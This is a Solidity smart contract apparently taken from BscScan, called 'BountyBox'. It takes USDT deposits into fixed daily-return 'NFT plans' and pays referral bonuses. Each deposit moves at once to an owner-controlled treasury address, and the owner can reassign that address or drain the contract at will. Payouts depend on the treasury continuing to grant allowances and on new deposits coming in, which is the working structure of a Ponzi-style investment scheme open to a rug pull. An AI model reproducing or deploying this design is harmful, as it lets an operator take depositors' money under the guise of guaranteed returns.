/**
 *Submitted for verification at BscScan.com on 2022-08-17
*/

/**
 *Submitted for verification at BscScan.com on 2022-08-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-08-08
*/

/**
 *Submitted for verification at polygonscan.com on 2021-08-20
*/

pragma solidity 0.5.9;



interface IBEP20 {
  /**
   * @dev Returns the amount of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the amount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract BountyBox {
    using SafeMath for uint256;

    // Operating costs 
	uint256 constant public adminFee = 100;
	uint256 constant public PERCENTS_DIVIDER = 1000;
    // Referral percentages
    uint8 public constant FIRST_REF = 10;
    // Limits
    uint256 public constant DEPOSIT_MIN_AMOUNT = 1 ether;
    
    uint constant public REINVEST_PERC = 0;
    // Before reinvest
    uint256 public constant WITHDRAWAL_DEADTIME = 1 days;
    // Max ROC days and related MAX ROC (Return of contribution)
    uint8 public constant CONTRIBUTION_DAYS = 100;
    uint256 public constant CONTRIBUTION_PERC = 150; //Changed
    uint256 public constant MAX_HOLD_PERCENT = 50;
    uint256 public constant TIME_STEP = 1 days;
    // Operating addresses
    address payable public owner;      // Smart Contract Owner (who deploys)
    address payable public treasury;
    IBEP20 usdt;

    uint256 total_investors;
    uint256 total_contributed;
    uint256 total_withdrawn;
    uint256 total_referral_bonus;
    uint8[] referral_bonuses;

    struct Plan {
        uint256 time;			// number of days of the plan
        uint16 percent;			// base percent of the plan (before increments)
        uint256 min_invest;
        uint256 max_invest;
        uint16 daily_flips;
    }

    struct PlayerDeposit {
        uint8 plan;
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }

     struct PlayerWitdraw{
        uint256 time;
        uint256 amount;
    }

    struct Player {
        address referral;
        uint256 dividends;
        uint256 referral_bonus;
        uint256 last_payout;
        uint256 last_withdrawal;
        uint256 total_contributed;
        uint256 total_withdrawn;
        uint256 total_referral_bonus;
        PlayerDeposit[] deposits;
        PlayerWitdraw[] withdrawals;
        mapping(uint8 => uint256) referrals_per_level;
    }

    mapping(address => Player) internal players;
    Plan[] internal plans;

    event Deposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event Reinvest(address indexed addr, uint256 amount);
    event ReferralPayout(address indexed addr, uint256 amount, uint8 level);
    event ReDeposit(address indexed addr, uint256 amount);


	constructor() public {
	    
        treasury = 0x8AD4E13e1722D0647738D7Ae876c0aA19618B8FC;
        owner = msg.sender;
        usdt = IBEP20(0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7);
        plans.push(Plan(10000, 200, 2e21, 6e22, 80));    //Box Games NFT plan
        plans.push(Plan(10000, 100, 2e20, 6e21, 40));    //Box MEME NFT plan
        plans.push(Plan(10000, 80, 4e19, 12e20, 20));    //Box Collectibles NFT plan
        plans.push(Plan(10000, 300, 6e22, 1e25, 200));   //Box Music NFT plan

        referral_bonuses.push(10 * FIRST_REF);
	}


    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }


    function deposit(address _referral, uint8 _plan, uint _amount) external{
        require(_plan < 4);
        require(!isContract(msg.sender) && msg.sender == tx.origin);
        require(!isContract(_referral));
        require(_amount >= 1e8, "Zero amount");
        // require(msg.value >= DEPOSIT_MIN_AMOUNT, "Deposit is below minimum amount");
        uint _planMin = plans[_plan].min_invest;
        uint _planMax = plans[_plan].max_invest;

        require(_amount >= _planMin, "Deposit is below minimum invest amount");
        require(_amount <= _planMax, "Deposit is above maximum invest amount");

        Player storage player = players[msg.sender];

        // require(player.deposits.length < 1500, "Max 1500 deposits per address");

        // Check and set referral
		require(usdt.transferFrom(msg.sender, treasury, _amount), "Transferred failed");
        
        _setReferral(msg.sender, _referral);

        // Create deposit
        player.deposits.push(PlayerDeposit({
            plan: _plan,
            amount: _amount,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
        }));

        // Add new user if this is first deposit
        if(player.total_contributed == 0x0){
            total_investors += 1;
        }

        player.total_contributed += _amount;
        total_contributed += _amount;

        // Generate referral rewards
        _referralPayout(msg.sender, _amount);

        // Pay fees
		// _feesPayout(_amount);

        emit Deposit(msg.sender, _amount);
    }


    function _setReferral(address _addr, address _referral) private {
        // Set referral if the user is a new user
        if(players[_addr].referral == address(0)) {
            // If referral is a registered user, set it as ref, otherwise set aAddress as ref
            if(players[_referral].total_contributed > 0) {
                players[_addr].referral = _referral;
            } else {
                players[_addr].referral = owner;
            }
            
            // Update the referral counters
            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                players[_referral].referrals_per_level[i]++;
                _referral = players[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }


    function _referralPayout(address _addr, uint256 _amount) private {
        address ref = players[_addr].referral;

        Player storage upline_player = players[ref];

        // Generate upline rewards
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            if(ref == address(0)) break;
            uint256 bonus = _amount * referral_bonuses[i] / 1000;

            players[ref].referral_bonus += bonus;
            players[ref].total_referral_bonus += bonus;
            total_referral_bonus += bonus;

            emit ReferralPayout(ref, bonus, (i+1));
            ref = players[ref].referral;
        }
    }


    // function _feesPayout(uint256 _amount) private {
    //     // Send fees if there is enough balance
    //     if (usdt.balanceOf(treasury) > _feesTotal(_amount)) {
    //         usdt.transferFrom(msg.sender, owner, _amount.mul(adminFee).div(PERCENTS_DIVIDER));
    //         // owner.transfer(_amount.mul(adminFee).div(PERCENTS_DIVIDER));
    //     }
    // }

    // Total fees amount
    function _feesTotal(uint256 _amount) private view returns(uint256 _fees_tot) {
        _fees_tot = _amount.mul(adminFee).div(PERCENTS_DIVIDER);

    }


    function withdraw(uint256 desiredAmount, address _user) public {
        Player storage player = players[msg.sender];
        PlayerDeposit storage first_dep = player.deposits[0];

        // Can withdraw once every WITHDRAWAL_DEADTIME days

        require(uint256(block.timestamp) > (player.last_withdrawal + WITHDRAWAL_DEADTIME) || (player.withdrawals.length <= 0), "You cannot withdraw during deadtime");
        require(usdt.balanceOf(treasury) > 0, "Cannot withdraw, contract balance is 0");
        require(player.deposits.length < 1500, "Max 1500 deposits per address");
        
        // Calculate dividends (ROC)
        uint256 payout = this.payoutOf(msg.sender);
        player.dividends += payout;

        // Calculate the amount we should withdraw
        uint256 amount_withdrawable = player.dividends + player.referral_bonus;
        require(amount_withdrawable > 0, "Zero amount to withdraw");
        require(desiredAmount <= amount_withdrawable, "Desired amount exceeds available balance");
        if(desiredAmount <= amount_withdrawable){
            amount_withdrawable = desiredAmount;
        }
        
        // Calculate the reinvest part and the wallet part
        uint256 autoReinvestAmount = amount_withdrawable.mul(REINVEST_PERC).div(100);
        uint256 withdrawableLessAutoReinvest = amount_withdrawable.sub(autoReinvestAmount);
        
        
        // Do Withdraw
        
		
        if (usdt.balanceOf(treasury) < withdrawableLessAutoReinvest) {
            player.dividends = withdrawableLessAutoReinvest.sub(usdt.balanceOf(treasury));
			withdrawableLessAutoReinvest = usdt.balanceOf(treasury);
		} else {
            player.dividends = 0;
        }
        require(usdt.transferFrom(treasury, _user, withdrawableLessAutoReinvest), "Transfer from failed");
        // msg.sender.transfer(withdrawableLessAutoReinvest);

        // Update player state
        player.referral_bonus = 0;
        player.total_withdrawn += amount_withdrawable;
        total_withdrawn += amount_withdrawable;
        player.last_withdrawal = uint256(block.timestamp);
        // If there were new dividends, update the payout timestamp
        if(payout > 0) {
            _updateTotalPayout(msg.sender);
            player.last_payout = uint256(block.timestamp);
        }
        
        // Add the withdrawal to the list of the done withdrawals
        player.withdrawals.push(PlayerWitdraw({
            time: uint256(block.timestamp),
            amount: amount_withdrawable
        }));
       

        emit Withdraw(msg.sender, amount_withdrawable);
    }


    function _updateTotalPayout(address _addr) private {
        Player storage player = players[_addr];

        // For every deposit calculate the ROC and update the withdrawn part
        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];
            uint _plan = dep.plan;
            uint time = plans[_plan].time;
            uint256 time_end = dep.time + time * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                uint timeMultiplier = plans[_plan].percent;
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * timeMultiplier / time / 8640000;
            }
        }
    }


    function withdrawalsOf(address _addrs) view external returns(uint256 _amount) {
        Player storage player = players[_addrs];
        // Calculate all the real withdrawn amount (to wallet, not reinvested)
        for(uint256 n = 0; n < player.withdrawals.length; n++){
            _amount += player.withdrawals[n].amount;
        }
        return _amount;
    }


    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        // For every deposit calculate the ROC
        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];
            uint _plan = dep.plan;
            uint time = plans[_plan].time;
            uint256 time_end = dep.time + time * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                uint timeMultiplier = plans[_plan].percent;
                value += dep.amount * (to - from) * timeMultiplier / time / 8640000;
            }
        }
        // Total dividends from all deposits
        return value;
    }


    function contractInfo() view external returns(uint256 _total_contributed, uint256 _total_investors, uint256 _total_withdrawn, uint256 _total_referral_bonus) {
        return (total_contributed, total_investors, total_withdrawn, total_referral_bonus);
    }


    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_referral_bonus, uint256 invested, uint256 withdrawn, uint256 referral_bonus, uint256[8] memory referrals, uint256 _last_withdrawal) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);

        // Calculate number of referrals for each level
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            referrals[i] = player.referrals_per_level[i];
        }
        // Return user information
        return (
            payout + player.dividends + player.referral_bonus,
            player.referral_bonus,
            player.total_contributed,
            player.total_withdrawn,
            player.total_referral_bonus,
            referrals,
            player.last_withdrawal
        );
    }

 
    function contributionsInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws, uint256[] memory depositPlan, uint256[] memory depTimes) {
        Player storage player = players[_addr];

        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);
        uint256[] memory _depositPlan = new uint256[](player.deposits.length);
        uint256[] memory _depTimes = new uint256[](player.deposits.length);

        // Create arrays with deposits info, each index is related to a deposit
        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];
          uint _plan = dep.plan;
          uint time = plans[_plan].time;
          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + time * 86400;
          _depositPlan[i] = _plan;
          _depTimes[i] = dep.time;
        }

        return (
          _endTimes,
          _amounts,
          _totalWithdraws,
          _depositPlan,
          _depTimes
        );
    }
    
    function emergencySwapExit() public returns(bool){
        require(msg.sender == owner, "You are not the owner!");
        msg.sender.transfer(address(this).balance);
        return true;
    }

    function setTreasury(address payable _treasury) external returns(address payable){
        require(msg.sender == owner, "You are not the owner!");
        treasury = _treasury;
        return treasury;
    }

    function transferOwnership(address payable _newOwner)external returns(address payable newOwner){
        require(msg.sender == owner, "You are not the owner!");
        owner = _newOwner;
        return owner;
    }
}


// Libraries used

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}